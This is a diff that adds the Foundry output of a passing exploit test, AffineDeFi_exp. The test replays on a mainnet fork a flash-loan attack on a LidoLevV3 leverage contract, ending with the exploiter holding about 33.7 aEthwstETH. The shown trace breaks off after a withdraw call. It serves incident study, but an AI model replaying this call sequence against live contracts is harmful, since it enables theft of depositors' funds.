@@ -1,0 +1,444 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/AffineDeFi_exp.sol:ExploitTest
+[PASS] testExploit() (gas: 766067)
+Logs:
+  Exploiter aEthwstETH balance before attack: 0.000000000000000000
+  Exploiter aEthwstETH balance after attack: 33.698806193381635860
+
+Traces:
+  [14797] ExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 19132934 [1.913e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(aEthwstETH: [0x0B925eD163218f6662a35e0f0371Ac234f9E9371], "aEthwstETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], "Balancer")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], "LidoLevV3")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [841767] ExploitTest::testExploit()
+    ├─ [23044] aEthwstETH::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [17992] AToken::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [10318] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [staticcall]
+    │   │   │   ├─ [5266] Pool::getReserveNormalizedIncome(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [2874] aEthwstETH::fallback() [staticcall]
+    │   ├─ [2357] AToken::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter aEthwstETH balance before attack", val: 0, decimals: 18)
+    ├─ [632675] Balancer::flashLoan(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [318973831042619036856 [3.189e20]], 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   ├─ [2534] WETH9::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   └─ ← [Return] 55912009748616849239618 [5.591e22]
+    │   ├─ [2350] ProtocolFeesCollector::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [27962] WETH9::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20])
+    │   │   ├─ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 318973831042619036856 [3.189e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x72abcc8c1956d2c5aceb3e4a4a26c855bc628660ed76bd1c9129d9ab812d24ea: 0 → 0x0000000000000000000000000000000000000000000000114aa6b15664c654b8
+    │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000000bd6ff01d7d7e4f9ae42 → 0x000000000000000000000000000000000000000000000bc5b45b26818033598a
+    │   │   └─ ← [Return] true
+    │   ├─ [576214] LidoLevV3::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [318973831042619036856 [3.189e20]], [0], 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   ├─ [17132] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   ├─ [12080] VariableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [6919] InitializableImmutableAdminUpgradeabilityProxy::fallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   ├─ [6399] Pool::getReserveNormalizedVariableDebt(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   └─ ← [Return] 353976785545105115749 [3.539e20]
+    │   │   │   └─ ← [Return] 353976785545105115749 [3.539e20]
+    │   │   ├─ [5544] aEthwstETH::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   ├─ [4992] AToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [1818] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [staticcall]
+    │   │   │   │   │   ├─ [1266] Pool::getReserveNormalizedIncome(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   │   └─ ← [Return] 340788235238642068114 [3.407e20]
+    │   │   │   └─ ← [Return] 340788235238642068114 [3.407e20]
+    │   │   ├─ [130184] InitializableImmutableAdminUpgradeabilityProxy::fallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 318973831042619036856 [3.189e20], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
+    │   │   │   ├─ [129649] Pool::repay(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 318973831042619036856 [3.189e20], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [125503] BorrowLogic::40e95de6(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003682b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f29000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000114aa6b15664c654b80000000000000000000000000000000000000000000000000000000000000002000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   ├─ [2968] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [2419] VariableDebtToken::scaledTotalSupply() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 453223569019806123998915 [4.532e23]
+    │   │   │   │   │   │   └─ ← [Return] 453223569019806123998915 [4.532e23]
+    │   │   │   │   │   ├─ [9982] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [4921] StableDebtToken::getSupplyData() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   │   ├─ [3201] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [2649] StableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [3038] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [2486] VariableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [1325] InitializableImmutableAdminUpgradeabilityProxy::fallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [805] Pool::getReserveNormalizedVariableDebt(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   │   │   │   └─ ← [Return] 353976785545105115749 [3.539e20]
+    │   │   │   │   │   │   └─ ← [Return] 353976785545105115749 [3.539e20]
+    │   │   │   │   │   ├─ [26087] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20], 1035024658069051456948664591 [1.035e27])
+    │   │   │   │   │   │   ├─ [25526] VariableDebtToken::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20], 1035024658069051456948664591 [1.035e27]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [7701] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 453223569019806123998915 [4.532e23], 341998408236463123361 [3.419e20])
+    │   │   │   │   │   │   │   │   ├─ [2675] RewardsController::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 453223569019806123998915 [4.532e23], 341998408236463123361 [3.419e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 318944848550144700161 [3.189e20])
+    │   │   │   │   │   │   │   ├─ emit Burn(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], target: 0x0000000000000000000000000000000000000000, value: 318944848550144700161 [3.189e20], balanceIncrease: 28982492474336695 [2.898e16], index: 1035024658069051456948664591 [1.035e27])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xc5a4446417df74ed5e0566b54b80821d4e335b6f7312c39070cee6a5bd20d520: 0x000000000358150d220274543e8b65ba00000000000000128a2e6c4e4b696ba1 → 0x00000000035826ff2489bafa33adf90f0000000000000001d5535af0029ef7e9
+    │   │   │   │   │   │   │   │   @ 58: 0x000000000000000000000000000000000000000000005ff94c853621776abec3 → 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
+    │   │   │   │   │   ├─ [7160] DefaultReserveInterestRateStrategy::calculateInterestRates(CalculateInterestRatesParams({ unbacked: 0, liquidityAdded: 318973831042619036856 [3.189e20], liquidityTaken: 0, totalStableDebt: 0, totalVariableDebt: 468778595722517357445717 [4.687e23], averageStableBorrowRate: 0, reserveFactor: 1500, reserve: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, aToken: 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8 })) [staticcall]
+    │   │   │   │   │   │   ├─ [2534] WETH9::balanceOf(InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 143009253559093150188127 [1.43e23]
+    │   │   │   │   │   │   └─ ← [Return] 15510134142072623979425932 [1.551e25], 92037529835702665603559294 [9.203e25], 23826270884991865922491506 [2.382e25]
+    │   │   │   │   │   ├─ emit ReserveDataUpdated(reserve: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], liquidityRate: 15510134142072623979425932 [1.551e25], stableBorrowRate: 92037529835702665603559294 [9.203e25], variableBorrowRate: 23826270884991865922491506 [2.382e25], liquidityIndex: 1019369531491344843689208548 [1.019e27], variableBorrowIndex: 1035024658069051456948664591 [1.035e27])
+    │   │   │   │   │   ├─ [8225] WETH9::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], 318973831042619036856 [3.189e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], value: 318973831042619036856 [3.189e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x72abcc8c1956d2c5aceb3e4a4a26c855bc628660ed76bd1c9129d9ab812d24ea: 0x0000000000000000000000000000000000000000000000114aa6b15664c654b8 → 0
+    │   │   │   │   │   │   │   @ 0xb064600732a82908427d092d333e607598a6238a59aeb45e1288cb0bac7161cf: 0x000000000000000000000000000000000000000000001e488c13507f1aad825f → 0x000000000000000000000000000000000000000000001e59d6ba01d57f73d717
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [3136] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20])
+    │   │   │   │   │   │   ├─ [578] AToken::handleRepayment(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   ├─ emit Repay(reserve: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], user: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], repayer: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], amount: 318973831042619036856 [3.189e20], useATokens: false)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec0: 0x00000000000cd8de9178580d386a8b1e00000000034b33db3ba2975be080c01f → 0x00000000000cd4660e7e92740cb1f08c00000000034b33e507c9c2422a5caae4
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec7: 0x00000000000000000000000000000000000000000000000455b045caf426f731 → 0x00000000000000000000000000000000000000000000000455f304f7a8840520
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec1: 0x000000000013b8d784c056e8bb500ba800000000035826efdf109d3f5cd62cc0 → 0x000000000013b568bb97eaae1823947200000000035826ff2489bafa33adf90f
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec2: 0x00000000000000000000000065bb6e0f00000000004c269be5ed3322f34dc781 → 0x00000000000000000000000065bb6f7700000000004c21b47d6a4f6177e9af7e
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000114aa6b15664c654b8
+    │   │   │   │   └─ ← [Return] 318973831042619036856 [3.189e20]
+    │   │   │   └─ ← [Return] 318973831042619036856 [3.189e20]
+    │   │   ├─ [230564] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], 307089429045260432253 [3.07e20], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
+    │   │   │   ├─ [230003] Pool::withdraw(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], 307089429045260432253 [3.07e20], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [2402] PoolAddressesProvider::getPriceOracle() [staticcall]
+    │   │   │   │   │   └─ ← [Return] AaveOracle: [0x54586bE62E3c3580375aE3723C145253060Ca0C2]
+    │   │   │   │   ├─ [216282] SupplyLogic::186dea44(00000000000000000000000000000000000000000000000000000000000000340000000000000000000000000000000000000000000000000000000000000036000000000000000000000000000000000000000000000000000000000000003782b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f290000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000000000000000000000000000000000000000000000010a5b8d0afe845b37d000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae142000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000054586be62e3c3580375ae3723c145253060ca0c20000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   │   │   ├─ [4968] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [2419] VariableDebtToken::scaledTotalSupply() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3994692854035745763711 [3.994e21]
+    │   │   │   │   │   │   └─ ← [Return] 3994692854035745763711 [3.994e21]
+    │   │   │   │   │   ├─ [7482] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [4921] StableDebtToken::getSupplyData() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   │   ├─ [1146] aEthwstETH::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [626] AToken::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 340608618017782968622 [3.406e20]
+    │   │   │   │   │   │   └─ ← [Return] 340608618017782968622 [3.406e20]
+    │   │   │   │   │   ├─ [9660] 0x7b8Fa4540246554e77FCFf140f9114de00F8bB8D::calculateInterestRates(CalculateInterestRatesParams({ unbacked: 0, liquidityAdded: 0, liquidityTaken: 307089429045260432253 [3.07e20], totalStableDebt: 0, totalVariableDebt: 4011075626650731686335 [4.011e21], averageStableBorrowRate: 0, reserveFactor: 1500, reserve: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, aToken: 0x0B925eD163218f6662a35e0f0371Ac234f9E9371 })) [staticcall]
+    │   │   │   │   │   │   ├─ [2534] WstETH::balanceOf(aEthwstETH: [0x0B925eD163218f6662a35e0f0371Ac234f9E9371]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 837016567033426250977516 [8.37e23]
+    │   │   │   │   │   │   └─ ← [Return] 12073175036517569424738 [1.207e22], 75424088663387665897500911 [7.542e25], 2977099746311124134688524 [2.977e24]
+    │   │   │   │   │   ├─ emit ReserveDataUpdated(reserve: WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], liquidityRate: 12073175036517569424738 [1.207e22], stableBorrowRate: 75424088663387665897500911 [7.542e25], variableBorrowRate: 2977099746311124134688524 [2.977e24], liquidityIndex: 1000527341973624759506438367 [1e27], variableBorrowIndex: 1004101134483577325977691581 [1.004e27])
+    │   │   │   │   │   ├─ [47493] aEthwstETH::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 307089429045260432253 [3.07e20], 1000527341973624759506438367 [1e27])
+    │   │   │   │   │   │   ├─ [46929] AToken::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 307089429045260432253 [3.07e20], 1000527341973624759506438367 [1e27]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [3201] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840584271767809850220061 [8.405e23], 340608618017782968622 [3.406e20])
+    │   │   │   │   │   │   │   │   ├─ [2675] RewardsController::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840584271767809850220061 [8.405e23], 340608618017782968622 [3.406e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 307089409295028918916 [3.07e20])
+    │   │   │   │   │   │   │   ├─ emit Burn(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], target: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 307089409295028918916 [3.07e20], balanceIncrease: 19750231513337 [1.975e13], index: 1000527341973624759506438367 [1e27])
+    │   │   │   │   │   │   │   ├─ [28068] WstETH::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 307089429045260432253 [3.07e20])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: aEthwstETH: [0x0B925eD163218f6662a35e0f0371Ac234f9E9371], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 307089429045260432253 [3.07e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xbb303388fb7ea20e521daeb37566c748b6cb117724b3acfa3fb984836a7ca12c: 0x00000000000000000000000000000000000000000000b13ec24f1510f2d650ec → 0x00000000000000000000000000000000000000000000b12e1c9644610a909d6f
+    │   │   │   │   │   │   │   │   │   @ 0xa69c31ad883ca5d0f069e8f3539b578234aa915726262552bd610e701e134b71: 0 → 0x000000000000000000000000000000000000000000000010a5b8d0afe845b37d
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xdeae47ff7bd01bad86820ae7179c8488fb5c841f1c7f147b7555c5347615fc5c: 0x00000000033b9de4bf1f13373cd2049a000000000000001276e4e57722ab312e → 0x00000000033b9de7e3d39a6f9a7c08df0000000000000001d36b1bc383a5d656
+    │   │   │   │   │   │   │   │   @ 54: 0x00000000000000000000000000000000000000000000b2002a287e7a70a21e1d → 0x00000000000000000000000000000000000000000000b1ef86aeb4c6d19cc345
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   ├─ [20142] AaveOracle::getAssetPrice(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   ├─ [14620] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   ├─ [7124] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 226467139000 [2.264e11]
+    │   │   │   │   │   │   │   └─ ← [Return] 226467139000 [2.264e11]
+    │   │   │   │   │   │   └─ ← [Return] 226467139000 [2.264e11]
+    │   │   │   │   │   ├─ [1123] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [603] VariableDebtToken::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 33818474013737809897 [3.381e19]
+    │   │   │   │   │   │   └─ ← [Return] 33818474013737809897 [3.381e19]
+    │   │   │   │   │   ├─ [1201] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [649] StableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [43723] AaveOracle::getAssetPrice(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [staticcall]
+    │   │   │   │   │   │   ├─ [38201] 0x8B6851156023f4f5A66F68BEA80851c3D905Ac93::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   ├─ [2120] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1124] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 226467139000 [2.264e11]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 226467139000 [2.264e11]
+    │   │   │   │   │   │   │   ├─ [31663] AppProxyUpgradeable::fallback(1000000000000000000 [1e18]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [8263] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   │   │   │   │   │   ├─ [2820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   │   │   │   │   ├─ [12783] Lido::getPooledEthByShares(1000000000000000000 [1e18]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1155550410231650977 [1.155e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1155550410231650977 [1.155e18]
+    │   │   │   │   │   │   │   └─ ← [Return] 261694195375 [2.616e11]
+    │   │   │   │   │   │   └─ ← [Return] 261694195375 [2.616e11]
+    │   │   │   │   │   ├─ [1146] aEthwstETH::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [626] AToken::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 33681044764761642582 [3.368e19]
+    │   │   │   │   │   │   └─ ← [Return] 33681044764761642582 [3.368e19]
+    │   │   │   │   │   ├─ emit Withdraw(reserve: WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], user: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], amount: 307089429045260432253 [3.07e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc9d7ec48cd0d839522455f78914adfeda8686316bb6819e0888e4bcd349e01ba: 0x000000000000000000000000000000000000000000000000015264950e1c4ee8 → 0x0000000000000000000000000000000000000000000000000153285af4e45435
+    │   │   │   │   │   │   @ 0xc9d7ec48cd0d839522455f78914adfeda8686316bb6819e0888e4bcd349e01b4: 0x0000000000027663729b40e592704c5b00000000033e929c15f06a84a035c0fc → 0x000000000002766ce68fdf7f0444770c00000000033e92af91f2e811efcd65bd
+    │   │   │   │   │   │   @ 0xc9d7ec48cd0d839522455f78914adfeda8686316bb6819e0888e4bcd349e01b3: 0x000000000000028e35e9d01ebf8fccd700000000033b9de7cfad859aecb1167c → 0x000000000000028e7cf6194a37766d6200000000033b9de7e3d39a6f9a7c08df
+    │   │   │   │   │   │   @ 0xc9d7ec48cd0d839522455f78914adfeda8686316bb6819e0888e4bcd349e01b5: 0x00000000000000000000010065bb60a700000000003e63a3a2ff26930e8043e0 → 0x00000000000000000000010065bb6f7700000000003e63ac0a117aa9ac9230ef
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000010a5b8d0afe845b37d
+    │   │   │   │   └─ ← [Return] 307089429045260432253 [3.07e20]
+    │   │   │   └─ ← [Return] 307089429045260432253 [3.07e20]
